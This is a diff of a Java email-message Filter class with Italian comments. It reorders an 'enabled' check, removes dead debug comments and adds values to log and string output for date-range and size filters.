@@ -225,16 +225,12 @@ public class Filter {
 
         long receivedTime;
 
-        /*
-         * debug.trace("invio dell'email " + message.getSentDate() + " long: "
-         * + message.getSentDate().getTime());
-         * debug.trace("arrivo dell'email " + message.getReceivedDate()
-         * + " long: " + message.getReceivedDate().getTime());
-         * debug.trace("filtro FROM enabled:" + doFilterFromDate + " : "
-         * + new Date(fromDate));
-         * debug.trace("filtro TO enabled:" + doFilterToDate + " : "
-         * + new Date(toDate));
-         */
+        if (!enabled) {
+            //#ifdef DEBUG_INFO
+            debug.info("Disabled");
+            //#endif            
+            return FILTERED_DISABLED;
+        }
 
         final Address[] from = message
                 .getRecipients(Message.RecipientType.FROM);
@@ -264,9 +260,6 @@ public class Filter {
 
             for (int i = 0; i < fsize; i++) {
                 if (folderTypes[i] == folderType) {
-                    //#ifdef DEBUG_TRACE
-                    //debug.trace("filterMessage type OK:" + folderType);
-                    //#endif
                     found = true;
                     break;
                 }
@@ -279,15 +272,6 @@ public class Filter {
                     + " type: " + folder.getType());
             //#endif
             return FILTERED_FOUND;
-        }
-        // Se c'e' un filtro sulla data
-        // entro
-
-        if (!enabled) {
-            //#ifdef DEBUG_INFO
-            debug.info("Disabled");
-            //#endif            
-            return FILTERED_DISABLED;
         }
 
         receivedTime = message.getReceivedDate().getTime();
@@ -302,7 +286,7 @@ public class Filter {
         // se c'e' il filtro from e non viene rispettato escludi la mail
         if (doFilterFromDate == true && receivedTime < fromDate.getTime()) {
             //#ifdef DEBUG_INFO
-            debug.info("doFilterFromDate");
+            debug.info("doFilterFromDate: " + fromDate);
             //#endif
             return FILTERED_FROM;
         }
@@ -311,16 +295,15 @@ public class Filter {
         // escludi la mail
         if (doFilterToDate == true && receivedTime > toDate.getTime()) {
             //#ifdef DEBUG_INFO
-            debug.info("doFilterToDate");
+            debug.info("doFilterToDate: " + toDate);
             //#endif
             return FILTERED_TO;
         }
 
-        final int trimAt = 0;
         if ((maxMessageSizeToLog > 0)
                 && (message.getSize() > maxMessageSizeToLog)) {
             //#ifdef DEBUG_INFO
-            debug.info("maxMessageSizeToLog");
+            debug.info("maxMessageSizeToLog: " + maxMessageSizeToLog);
             //#endif
             return FILTERED_SIZE;
         }
@@ -363,12 +346,12 @@ public class Filter {
         }
 
         if (doFilterFromDate == true && fromDate != null) {
-            sb.append(" from:");
+            sb.append(" from: ");
             sb.append(fromDate);
         }
 
         if (doFilterToDate == true && toDate != null) {
-            sb.append(" to:");
+            sb.append(" to: ");
             sb.append(toDate);
         }
 
